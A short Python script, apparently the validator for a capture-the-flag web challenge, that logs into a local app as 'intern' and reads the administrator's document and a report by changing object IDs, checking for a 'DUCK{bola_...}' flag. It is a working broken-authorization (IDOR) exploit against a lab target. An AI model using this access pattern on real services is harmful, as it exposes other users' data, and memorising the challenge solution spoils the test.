import re
import sys
import requests

base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
s = requests.Session()

r = s.post(
    f"{base}/login",
    data={"username": "intern", "password": "intern123"},
    allow_redirects=False,
    timeout=5,
)
assert r.status_code in (302, 303)

own = s.get(f"{base}/api/documents/1042", timeout=5)
assert own.status_code == 200 and own.json()["owner"] == "intern"

cross = s.get(f"{base}/api/documents/1044", timeout=5)
assert cross.status_code == 200 and cross.json()["owner"] == "administrator"

report = s.get(f"{base}/api/reports/7331", timeout=5)
assert report.status_code == 200
flag = report.json().get("flag", "")
assert re.fullmatch(r"DUCK\{bola_[0-9a-f]{16}\}", flag)
print("validation: PASS")
